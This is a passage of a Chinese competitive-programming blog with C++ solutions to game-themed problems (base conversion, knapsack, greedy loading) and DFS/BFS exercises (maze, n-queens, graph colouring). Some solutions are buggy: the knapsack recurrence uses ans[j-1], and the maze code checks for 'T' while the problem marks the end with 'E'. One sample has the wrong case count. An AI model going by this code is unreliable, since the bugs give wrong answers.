<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> t,m;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> c,r;
	r=n%<span class="hljs-number">7</span>;
	c=n/<span class="hljs-number">7</span>;
	<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)
	&#123;
		convert(c);
		<span class="hljs-built_in">cout</span>&lt;&lt;r;
	&#125;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;n;
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;t;
	<span class="hljs-keyword">while</span>(t--)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		convert(m);
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre>

<h2 id="问题-C-圣诞恋歌——貂蝉"><a href="#问题-C-圣诞恋歌——貂蝉" class="headerlink" title="问题 C: 圣诞恋歌——貂蝉"></a>问题 C: 圣诞恋歌——貂蝉</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p>
<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。</p>
<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p>
<h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs plain">6
1
2
3
45
81</code></pre>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs plain">1
2
4
57
121</code></pre>

<h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>这题就是汽水瓶的改编。。。</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n; 
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m,sum;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		sum=<span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)
		&#123;
			m=m<span class="hljs-number">-2</span>;
			sum=sum+<span class="hljs-number">3</span>;
		&#125;	
		<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)
		sum+=<span class="hljs-number">4</span>;
		<span class="hljs-keyword">else</span>
		sum=m;
		<span class="hljs-built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="hljs-built_in">endl</span>; 
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p>
<p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p>
<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p>
<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p>
<h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">2</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">20 </span><span class="hljs-number">9</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre>

<h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs plain">3
6</code></pre>

<h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>就是简单的装在问题</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> T,m,n;
<span class="hljs-keyword">int</span> w[<span class="hljs-number">1005</span>];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;
		<span class="hljs-built_in">cin</span>&gt;&gt;m&gt;&gt;n;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i];
		&#125;
		sort(w,w+n);
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-keyword">if</span>(m&gt;=w[i])
			&#123;
				ans++;
				m-=w[i];
			&#125;
			<span class="hljs-keyword">else</span>
			<span class="hljs-keyword">break</span>; 
		&#125; 
		<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p>
<p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p>
<p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？</p>
<h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。</p>
<p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。</p>
<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p>
<h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">1</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">6</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">6 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">5 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre>

<h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs plain">15</code></pre>

<h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>01背包问题，不知道下面的解能不能过</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ans[N];
<span class="hljs-keyword">int</span> w[N],v[N];
<span class="hljs-keyword">int</span> T;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> C,N;
		<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(ans));
		<span class="hljs-built_in">cin</span>&gt;&gt;C&gt;&gt;N;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];
		&#125;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=C;j&gt;=w[i];j--)
			ans[j]=max(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);
		&#125;
<span class="hljs-comment">//		for(int i=0;i&lt;=C;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;ans[i]&lt;&lt;endl;</span>
		<span class="hljs-built_in">cout</span>&lt;&lt;ans[C]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125; 
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<p>ps:以上代码没有提交测试环境，只是过了给出的测试样例。</p>
<h1 id="dfs大合集"><a href="#dfs大合集" class="headerlink" title="dfs大合集"></a>dfs大合集</h1><h2 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br>小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br>每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br>接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br>字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br>输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs asciidoc">1
5 5
s-###
-----
##---
E#---
---##</code></pre>

<h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs plain">9</code></pre>

<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;  <span class="hljs-comment">//坐标</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(sx,sy));   <span class="hljs-comment">//将起点坐标放入队头 </span>
	de[sx][sy]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   <span class="hljs-comment">//取出队头坐标 </span>
		qu.pop() ;<span class="hljs-comment">//删除对头及走过的坐标 </span>
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//到达终点 跳出循环		</span>
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//开始向四个方向移动 </span>
			ny=y+to[<span class="hljs-number">1</span>][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 			<span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 			&#123;
			     	qu.push(P(nx,ny));      <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
			    	de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
				&#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;T&#x27;</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="acwing迷宫问题"><a href="#acwing迷宫问题" class="headerlink" title="acwing迷宫问题"></a>acwing迷宫问题</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> dis[N][N];
<span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;
<span class="hljs-keyword">int</span> x,y,nx,ny;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(dis));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));
	dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty())
	&#123;
		P p=qu.front();
		qu.pop();
		x=p.first,y=p.second;
		<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];
			<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)
			&#123;
				qu.push(P(nx,ny));
				dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;
			&#125;
		 &#125; 
		
	&#125;
	<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)
	<span class="hljs-built_in">cout</span>&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];
	<span class="hljs-keyword">return</span>; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)
	<span class="hljs-built_in">cin</span>&gt;&gt;mp[i][j];
	dfs();
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="n皇后问题"><a href="#n皇后问题" class="headerlink" title="n皇后问题"></a>n皇后问题</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> n,ans=<span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">20</span>;
<span class="hljs-keyword">char</span> m[N][N];
<span class="hljs-keyword">bool</span> col[N],dg[N],udg[N];
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(u==n)
	&#123;
<span class="hljs-comment">//		for(int i=0;i&lt;n;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;m[i]&lt;&lt;endl;</span>
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])
		&#123;
			m[u][i]=<span class="hljs-string">&#x27;Q&#x27;</span>;
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;
			dfs(u+<span class="hljs-number">1</span>);
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//回溯恢复现场 </span>
			m[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;
		&#125;
	&#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)
		m[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;
	dfs(<span class="hljs-number">0</span>);
	<span class="hljs-built_in">cout</span>&lt;&lt;ans;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="m图着色问题"><a href="#m图着色问题" class="headerlink" title="m图着色问题"></a>m图着色问题</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p>
<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p>
<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p>
<h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">3</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre>

<h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs plain">48</code></pre>

<h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;
<span class="hljs-keyword">int</span> n,k,m,ans=<span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> d)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)
	&#123;
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)
	&#123;
		<span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)
		&#123;
			<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)
			&#123;
				flag=<span class="hljs-number">0</span>;
				<span class="hljs-keyword">break</span>;
			&#125;
		 &#125;
		 <span class="hljs-keyword">if</span>(flag)
		 &#123;
		 	 color[d]=i;
			 dfs(d+<span class="hljs-number">1</span>);
			 color[d]=<span class="hljs-number">0</span>; 	
		 &#125; 
	 &#125; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)
	&#123;
		<span class="hljs-keyword">int</span> t1,t2;
		<span class="hljs-built_in">cin</span>&gt;&gt;t1&gt;&gt;t2;
		mp[t1][t2]=<span class="hljs-number">1</span>;
		mp[t2][t1]=<span class="hljs-number">1</span>;
	&#125;
	dfs(<span class="hljs-number">1</span>);
